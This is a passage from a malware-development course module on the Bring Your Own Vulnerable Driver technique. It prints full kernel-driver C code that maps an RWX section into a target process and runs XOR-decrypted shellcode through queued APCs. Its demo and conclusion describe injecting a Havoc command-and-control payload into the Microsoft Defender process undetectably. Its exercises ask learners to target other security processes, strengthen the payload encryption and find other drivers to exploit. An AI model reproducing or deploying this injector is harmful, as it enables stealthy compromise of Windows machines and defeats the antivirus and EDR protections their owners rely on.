BOOLEAN <span class="token function">ExecuteShellcode</span><span class="token punctuation">(</span>IN PVOID pInjectedUMShellcode<span class="token punctuation">,</span> IN PETHREAD peAlertableThreadId<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BOOLEAN     	bSTATE			<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	PKAPC       	pkUserMApc		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			        pkKernelMApc		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pInjectedUMShellcode <span class="token operator">||</span> <span class="token operator">!</span>peAlertableThreadId<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// ALlocate memory for the APCs</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pkUserMApc <span class="token operator">=</span> <span class="token punctuation">(</span>PKAPC<span class="token punctuation">)</span><span class="token function">ExAllocatePool2</span><span class="token punctuation">(</span>POOL_FLAG_NON_PAGED<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>KAPC<span class="token punctuation">)</span><span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ExAllocatePool2 [1] Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pkKernelMApc <span class="token operator">=</span> <span class="token punctuation">(</span>PKAPC<span class="token punctuation">)</span><span class="token function">ExAllocatePool2</span><span class="token punctuation">(</span>POOL_FLAG_NON_PAGED<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>KAPC<span class="token punctuation">)</span><span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ExAllocatePool2 [2] Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Intialize the APCs</span>
	<span class="token function">KeInitializeApc</span><span class="token punctuation">(</span>pkKernelMApc<span class="token punctuation">,</span> peAlertableThreadId<span class="token punctuation">,</span> OriginalApcEnvironment<span class="token punctuation">,</span> <span class="token punctuation">(</span>PKKERNEL_ROUTINE<span class="token punctuation">)</span>KernelModeApcCallback<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> KernelMode<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">KeInitializeApc</span><span class="token punctuation">(</span>pkUserMApc<span class="token punctuation">,</span> peAlertableThreadId<span class="token punctuation">,</span> OriginalApcEnvironment<span class="token punctuation">,</span> <span class="token punctuation">(</span>PKKERNEL_ROUTINE<span class="token punctuation">)</span>UserModeApcCallback<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>PKNORMAL_ROUTINE<span class="token punctuation">)</span>pInjectedUMShellcode<span class="token punctuation">,</span> UserMode<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Execute the APCs (user mode before kernel mode)</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">KeInsertQueueApc</span><span class="token punctuation">(</span>pkUserMApc<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] KeInsertQueueApc [1] Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">KeInsertQueueApc</span><span class="token punctuation">(</span>pkKernelMApc<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] KeInsertQueueApc [2] Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	bSTATE <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

_FUNC_CLEANUP<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bSTATE <span class="token operator">&amp;&amp;</span> pkUserMApc<span class="token punctuation">)</span>
		<span class="token function">ExFreePoolWithTag</span><span class="token punctuation">(</span>pkUserMApc<span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bSTATE <span class="token operator">&amp;&amp;</span> pkKernelMApc<span class="token punctuation">)</span>
		<span class="token function">ExFreePoolWithTag</span><span class="token punctuation">(</span>pkKernelMApc<span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> bSTATE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>


BOOLEAN <span class="token function">InjectPayload</span><span class="token punctuation">(</span>IN PVOID pShellcode<span class="token punctuation">,</span> IN SIZE_T sShellcodeSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        BOOLEAN                 bSTATE            <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
        PETHREAD                hThread           <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        HANDLE                  hProcessId        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
                                hThreadId         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
                                hProcess          <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
                                hSection          <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        NTSTATUS                STATUS            <span class="token operator">=</span> STATUS_SUCCESS<span class="token punctuation">;</span>
        OBJECT_ATTRIBUTES       ObjectAttr        <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x00</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        CLIENT_ID               ClientId          <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x00</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        PVOID                   pLocalAddress     <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
                                pRemoteAddress    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        SIZE_T                  sViewSize         <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>


	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pShellcode <span class="token operator">||</span> <span class="token operator">!</span>sShellcodeSize<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Get target process ID and an alertable thread</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchTargetProcessAndThread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hProcessId<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hThreadId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] FetchTargetProcessAndThread Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Found %ws's PID: %ld \n"</span><span class="token punctuation">,</span> g_TargetProcessName<span class="token punctuation">,</span> hProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Found Alertable Thread Of ID: %ld \n"</span><span class="token punctuation">,</span> hThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Open process handle</span>
	<span class="token function">InitializeObjectAttributes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ObjectAttr<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> OBJ_KERNEL_HANDLE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ClientId<span class="token punctuation">.</span>UniqueProcess <span class="token operator">=</span> hProcessId<span class="token punctuation">;</span>
	ClientId<span class="token punctuation">.</span>UniqueThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwOpenProcess</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hProcess<span class="token punctuation">,</span> PROCESS_ALL_ACCESS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ObjectAttr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ClientId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ZwOpenProcess Failed With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Opened A Handle To %ws: 0x%0.8X \n"</span><span class="token punctuation">,</span> g_TargetProcessName<span class="token punctuation">,</span> hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Create a RWX section </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CreateSharedSection</span><span class="token punctuation">(</span>sShellcodeSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hSection<span class="token punctuation">)</span> <span class="token operator">||</span> hSection <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Map the section to kernel memory</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwMapViewOfSection</span><span class="token punctuation">(</span>hSection<span class="token punctuation">,</span> <span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLocalAddress<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sViewSize<span class="token punctuation">,</span> ViewUnmap<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ZwMapViewOfSection [1] Failed With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Allocated Local RW Memory: 0x%p \n"</span><span class="token punctuation">,</span> pLocalAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Copy payload to kernel memory</span>
	<span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>pLocalAddress<span class="token punctuation">,</span> pShellcode<span class="token punctuation">,</span> sShellcodeSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Copied Payload To Local Memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Map the payload to the user-mode process</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwMapViewOfSection</span><span class="token punctuation">(</span>hSection<span class="token punctuation">,</span> hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pRemoteAddress<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sViewSize<span class="token punctuation">,</span> ViewShare<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ZwMapViewOfSection [2] Failed With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Allocated Remote RWX Memory In %ws At: 0x%p \n"</span><span class="token punctuation">,</span> g_TargetProcessName<span class="token punctuation">,</span> pRemoteAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Execute the payload</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ExecuteShellcode</span><span class="token punctuation">(</span>pRemoteAddress<span class="token punctuation">,</span> hThread<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ExecuteShellcode Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Payload Executed Successfully! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	bSTATE <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

_FUNC_CLEANUP<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bSTATE <span class="token operator">&amp;&amp;</span> pLocalAddress<span class="token punctuation">)</span>
		<span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pLocalAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bSTATE <span class="token operator">&amp;&amp;</span> pRemoteAddress<span class="token punctuation">)</span>
		<span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pRemoteAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hSection<span class="token punctuation">)</span>
		<span class="token function">ZwClose</span><span class="token punctuation">(</span>hSection<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span>
		<span class="token function">ZwClose</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hThread<span class="token punctuation">)</span>
		<span class="token function">ObDereferenceObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> bSTATE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>
<span class="token comment">// Encrypted payload to execute inside the target user-mode process</span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> Encrypted<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x90</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>

NTSTATUS <span class="token function">LdrDriverEntry</span><span class="token punctuation">(</span>IN PDRIVER_OBJECT pDriverObject<span class="token punctuation">,</span> IN PUNICODE_STRING pRegistryPath<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>pDriverObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>pRegistryPath<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Driver Loaded Successfully \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Decrypting the payload</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>SIZE_T i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
			Encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x3C</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
			Encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x85</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span>
			Encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x2A</span><span class="token punctuation">;</span>

	<span class="token punctuation">}</span>

	<span class="token function">InjectPayload</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span>Encrypted<span class="token punctuation">,</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Encrypted<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[*] DONE!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><code>KernelLdr.sys</code> was based on the following publicly available repositories:</p>
<ul>
<li>
<p><a href="https://github.com/danielkrupinski/KernelProcessList" target="_blank">KernelProcessList</a> - Example Windows Kernel-mode Driver which enumerates running processes.</p>
</li>
<li>
<p><a href="https://github.com/adrianyy/KeInject" target="_blank">KeInject</a> - Kernel LdrLoadDll injector.</p>
</li>
<li>
<p><a href="https://github.com/Idov31/Nidhogg" target="_blank">Nidhogg</a> - All-in-one simple to use rootkit for red teams.</p>
</li>
</ul>
<h3 id="toc-heading-13">Demo</h3>
<p>The below image shows <em>KernelLdr.sys</em> injecting a Havoc demon payload into <code>MsMpEng.exe</code> where it's executed undetectably.</p>
<img width="1400px" alt="image" style="margin:auto" src="27_files/byovd-663510502-b38b2bbc-b94b-4446-9790-d78c2fee70b2.png">
<h3 id="toc-heading-14">Video Demo</h3>
<video style="margin:auto" width="1400" controls="controls" class="js-parse-2dd74396fb4949db9d79c16e578d6d88">
  <source src="27_files/BYOVD-Demo.mp4" type="video/mp4" class="js-parse-2dd74396fb4949db9d79c16e578d6d88">
  Your browser does not support the video tag.
</video>
<h3 id="toc-heading-15">Conclusion</h3>
<p>As we've discussed in this module, the BYOVD approach can be 
extremely powerful, especially when the vulnerable driver is exploited 
to write to kernel memory. This capability allows us to map unsigned 
drivers. As demonstrated earlier, injecting your command and control 
payload into an AV/EDR process can be a very effective technique for 
memory manipulation. This is particularly advantageous because these 
security solutions often overlook themselves.</p>
<p>The code shared in this module includes an updated version of the 
kdmapper project, a precompiled "HelloWorld" driver along with its 
source code, the payload encryption project, and the KernelLdr project. 
Additionally, you'll find the vulnerable driver <code>IQVW64.sys</code>, although it's worth noting that the driver file is not required to execute the BYOVD attack.</p>

    </div>

    
        
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Modify the code to inject into a different trusted process (e.g. NisSrv.exe)</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use RC4 or AES instead of XOR in kdmapper</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">OPTIONAL: Find a different driver to exploit</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Bring Your Own Vulnerable Driver (BYOVD)</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">Circumventing Signature Enforcement</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">Exploitation Scenario</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">Exploiting CVE-2015-2291</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">IOCTL</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">Kdmapper</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">Updating Kdmapper</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">XOR Encryption</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-9">
        <span class="text-gray-300 hover:text-white text-sm">IAT Hashing</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-10">
        <span class="text-gray-300 hover:text-white text-sm">Testing HelloWorld.sys</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-11">
        <span class="text-gray-300 hover:text-white text-sm">Building The Unsigned Driver</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-12">
        <span class="text-gray-300 hover:text-white text-sm">KernelLdr Complete Code</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-13">
        <span class="text-gray-300 hover:text-white text-sm">Demo</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-14">
        <span class="text-gray-300 hover:text-white text-sm">Video Demo</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-15">
        <span class="text-gray-300 hover:text-white text-sm">Conclusion</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="27_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
